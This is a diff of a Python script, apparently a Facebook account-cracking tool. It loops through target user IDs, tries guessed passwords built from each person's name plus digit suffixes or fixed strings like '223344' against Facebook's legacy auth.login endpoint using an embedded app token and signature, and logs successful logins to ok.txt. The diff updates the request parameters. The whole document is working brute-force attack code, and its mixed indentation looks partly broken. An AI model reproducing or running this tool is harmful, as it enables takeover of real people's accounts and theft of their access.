@@ -318,10 +318,8 @@ def b_menu_select():
 		user=arg
 		uid,name=user.split("|")
 		try:
-		    r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
-		    z = json.loads(r.text)
 		    pass1=name+"12"
-		    data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email="+uid+"&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
+		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		    d=json.loads(q)
 		    if "access_token" in d:
 		        print("\x1b[1;92m[\x1b[1;97mOk\x1b[1;92m]\x1b[1;92m "+uid+"\x1b[1;92m | \x1b[1;92m"+pass1+"\x1b[1;92m | \x1b[1;92m"+name)
@@ -330,10 +328,8 @@ def b_menu_select():
 		        cp.close()
 		        cps.append(uid)
 		    else:
-			    r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
-			    z = json.loads(r.text)
 		            pass2=name+"123"
-		            data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email="+uid+"&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
+		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		            d=json.loads(q)
 		            if 'access_token' in d:
 		                print("\x1b[1;92m[\x1b[1;97mOk\x1b[1;92m]\x1b[1;92m "+uid+"\x1b[1;92m | \x1b[1;92m"+pass2+"\x1b[1;92m | \x1b[1;92m"+name)
@@ -342,10 +338,8 @@ def b_menu_select():
 		                ok.close()
 		                oks.append(uid)
 		            else:
-				r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
-		                z = json.loads(r.text)
 				pass3=name+"1234"
-				data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email="+uid+"&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
+				q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		                d=json.loads(q)
 		                if 'access_token' in d:
 		                    print("\x1b[1;92m[\x1b[1;97mOk\x1b[1;92m]\x1b[1;92m "+uid+"\x1b[1;92m | \x1b[1;92m"+pass3+"\x1b[1;92m | \x1b[1;92m"+name)
@@ -354,10 +348,8 @@ def b_menu_select():
 		                    ok.close()
 		                    oks.append(uid)
 		                else:
-				    r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
-		                    z = json.loads(r.text)
 		                    pass4=name+"12345"
-		                    data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email="+uid+"&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
+		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		                    d=json.loads(q)
 		                    if 'access_token' in d:
 		                        print("\x1b[1;92m[\x1b[1;97mOk\x1b[1;92m]\x1b[1;92m "+uid+"\x1b[1;92m | \x1b[1;92m"+pass4+"\x1b[1;92m | \x1b[1;92m"+name)
@@ -366,10 +358,8 @@ def b_menu_select():
 		                        ok.close()
 		                        oks.append(uid)
 		                    else:
-					r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
-		                        z = json.loads(r.text)
 					pass5=name+"1122"
-					data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email="+uid+"&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
+					q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		                        d=json.loads(q)
 		                        if 'access_token' in d:
 		                            print("\x1b[1;92m[\x1b[1;97mOk\x1b[1;92m]\x1b[1;92m "+uid+"\x1b[1;92m | \x1b[1;92m"+pass5+"\x1b[1;92m | \x1b[1;92m"+name)
@@ -378,11 +368,9 @@ def b_menu_select():
 		                            ok.close()
 		                            oks.append(uid)
 		                        else:
-					    r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
-		                            z = json.loads(r.text)
 		                            pass6="223344"
-					    data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email="+uid+"&locale=en_US&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
-		                            d=json.loads(q)
+					   q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
+		                           d=json.loads(q)
 		                            if 'access_token' in d:
 		                                print("\x1b[1;92m[\x1b[1;97mOk\x1b[1;92m]\x1b[1;92m "+uid+"\x1b[1;92m | \x1b[1;92m"+pass6+"\x1b[1;92m | \x1b[1;92m"+name)
 		                                ok=open("ok.txt","a")
@@ -390,10 +378,8 @@ def b_menu_select():
 		                                ok.close()
 		                                oks.append(uid)
 		                            else:
-						r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
-		                                z = json.loads(r.text)
 						pass7="334455"
-						data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email="+uid+"&locale=en_US&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
+						q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		                                d=json.loads(q)
 		                                if 'access_token' in d:
 		                                    print("\x1b[1;92m[\x1b[1;97mOk\x1b[1;92m]\x1b[1;92m "+uid+"\x1b[1;92m | \x1b[1;92m"+pass7+"\x1b[1;92m | \x1b[1;92m"+name)
@@ -402,8 +388,6 @@ def b_menu_select():
 		                                    ok.close()
 		                                    oks.append(uid)
 		                                else:
-						    r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
-		                                    z = json.loads(r.text)
 		                                    pass8="445566"
 		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass8 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		                                    d=json.loads(q)
@@ -414,8 +398,6 @@ def b_menu_select():
 		                                        ok.close()
 		                                        oks.append(uid)
 		                                    else:
-							r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
-		                                        z = json.loads(r.text)
 							pass9="556677"
 							q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass9 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		                                        d=json.loads(q)
@@ -426,8 +408,6 @@ def b_menu_select():
 		                                            ok.close()
 		                                            oks.append(uid)
 		                                        else:
-							    r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
-		                                            z = json.loads(r.text)
 		                                            pass10="234567"
 		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass10 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		                                            d=json.loads(q)
